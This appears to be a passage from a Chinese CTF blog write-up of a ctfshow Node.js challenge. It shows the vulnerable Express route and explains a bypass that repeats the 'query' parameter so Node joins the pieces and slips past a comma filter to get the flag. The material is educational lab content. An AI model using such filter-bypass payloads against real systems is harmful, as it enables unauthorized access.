+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>根据源码我们应该传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:&quot;true)&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>req.url.match(/8c|2c|\,/ig)</code>但是正则过滤了空字符 逗号以及其url编码 </p>
+<p> 看了大佬的wp 应该这样传<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code> url编码之后传上去</p>
+<p> nodejs中会把这三部分拼接起来 </p>
+<p>被传入之后req.query被解析成了一个数组，之后在JSON.parse的解析下变成了对象，就变成了我们想要的结果了。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag"># nodejs原型链污染</a>
+              <a href="/tags/nodejs/" rel="tag"># nodejs</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/post/232bb69.html" rel="prev" title="贵阳大数据及网络安全精英对抗赛WEB部分WP">
+                  <i class="fa fa-chevron-left"></i> 贵阳大数据及网络安全精英对抗赛WEB部分WP
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2023.2 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+    </div>
+  </footer>
+
+  
+
+  <a href="https://github.com/Z1d10t" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
+
